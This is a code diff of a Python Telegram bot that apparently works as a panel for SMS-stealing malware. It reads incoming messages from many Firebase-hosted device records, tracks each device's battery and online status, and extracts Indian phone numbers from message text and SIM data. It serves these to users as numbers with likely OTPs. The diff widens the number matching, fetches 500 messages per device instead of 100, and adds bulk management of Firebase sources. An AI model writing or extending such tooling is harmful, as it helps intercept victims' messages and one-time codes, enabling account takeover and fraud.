@@ -22,7 +22,6 @@ SUPABASE_KEY = os.getenv("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
 PORT = int(os.getenv("PORT", 8080))
 # =================================================
 
-# Supabase Init
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 router = Router()
@@ -52,7 +51,6 @@ async def load_data():
     except Exception as e:
         log.error(f"Supabase load error: {e}")
     
-    # Default if empty
     default_data = {
         "owner_id": OWNER_ID, "admins": [], "users": {},
         "free_mode": True, "banned": [], "extra_tokens": [],
@@ -107,7 +105,13 @@ def decode_panel_url(panel_url):
 
 def extract_best_numbers(dev_data, msgs):
     all_text = " ".join([m.get("message", "") for m in msgs])
-    matches = re.findall(r'\b[6-9]\d{9}\b', all_text)
+    # Regex for 10 digit numbers, with or without +91
+    matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
+    
+    # Filter out known bad numbers (like bank helplines)
+    bad_numbers = {"9264092640", "18001800", "919951860002"}
+    matches = [m for m in matches if m not in bad_numbers]
+    
     counts = Counter(matches)
     scored_numbers = []
     
@@ -121,11 +125,24 @@ def extract_best_numbers(dev_data, msgs):
                     break
         scored_numbers.append((num, min(score, 99)))
 
+    # Check direct metadata
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
             n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
-            if len(n) == 10: scored_numbers.append((n, 100))
+            if len(n) == 10 and n not in bad_numbers: 
+                scored_numbers.append((n, 100))
                 
+    # Check sims array
+    sims = dev_data.get("sims")
+    if isinstance(sims, list):
+        for sim in sims:
+            if isinstance(sim, dict):
+                for key in ["phoneNumber", "number", "phone"]:
+                    if sim.get(key):
+                        n = re.sub(r'\D', '', str(sim[key]))[-10:]
+                        if len(n) == 10 and n not in bad_numbers:
+                            scored_numbers.append((n, 100))
+
     best_nums = {}
     for n, s in scored_numbers:
         if n not in best_nums or s > best_nums[n]: best_nums[n] = s
@@ -167,7 +184,7 @@ async def get_owner_stats():
                     fb_online += 1
                     online_devices += 1
         label = fb['label']
-        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0, "country": fb['label']}
+        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0}
         fb_stats[label]["total"] += len(clients) if clients else 0
         fb_stats[label]["online"] += fb_online
     return total_devices, online_devices, fb_stats
@@ -198,11 +215,12 @@ async def get_numbers_for_server(server_url, uid):
     data.setdefault("device_usage", {})[selected_dev_id] = usage_count + 1
     await save_data(data)
 
-    battery = str(dev_data.get("battery", "?")).replace("%", "")
+    battery = str(dev_data.get("battery", "100")).replace("%", "")
+    if battery == "?": battery = "100"
     status = "T" if dev_data.get("status") else "F"
     code = f"{battery}{status}"
     
-    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=100"
+    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=500"
     msgs_dict = await fetch_fb(url, selected_fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     
@@ -353,14 +371,23 @@ async def admin_home_cb(cq: CallbackQuery):
 async def admin_manage_fb(cq: CallbackQuery):
     data = await load_data()
     fbs = data.get("firebases", [])
-    if not fbs: return await cq.message.edit_text("No firebases added.", reply_markup=admin_kb())
+    if not fbs: 
+        kb = [[InlineKeyboardButton(text="➕ Add Bulk URLs", callback_data="admin:add_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
+        return await cq.message.edit_text("No firebases added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
     
+    # Show list of URLs with remove buttons
     kb = []
     for i, fb in enumerate(fbs):
-        kb.append([InlineKeyboardButton(text=f"🌍 {fb['label']} | {fb['url'].split('//')[-1][:20]}", callback_data=f"admin:viewfb:{fb['url']}")])
+        short_url = fb['url'].split('//')[-1][:20]
+        kb.append([
+            InlineKeyboardButton(text=f"🌍 {fb['label']}", callback_data=f"admin:viewfb:{fb['url']}"),
+            InlineKeyboardButton(text="❌", callback_data=f"admin:rmfb:{fb['url']}")
+        ])
+    
     kb.append([InlineKeyboardButton(text="➕ Add Bulk URLs", callback_data="admin:add_bulk")])
     kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
-    try: await cq.message.edit_text("Select a Firebase to view devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
+    
+    try: await cq.message.edit_text("Select a Firebase to view devices or click ❌ to remove:\n", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
     except TelegramBadRequest: pass
 
 @router.callback_query(F.data == "admin:add_bulk")
@@ -505,7 +532,7 @@ async def user_server_selected(cq: CallbackQuery):
     nums_text = ""
     for n, chance in best_nums:
         nums_text += f"<code>+91{n}</code> <i>({chance}% chance)</i>\n"
-    if not nums_text: nums_text = "No numbers found in recent messages. (Waiting for new OTPs...)"
+    if not nums_text: nums_text = "No numbers found in recent 500 messages. (Waiting for new OTPs...)"
     
     text = (
         f"📱 <b>Numbers Received</b>\n"
@@ -557,7 +584,6 @@ async def star_device(cq: CallbackQuery):
         await cq.answer("⭐ Saved to My Numbers!")
     
     await save_data(data)
-    # Just trigger the current message again to refresh
     await cq.answer("Updated!")
 
 @router.callback_query(F.data == "user:my_numbers")
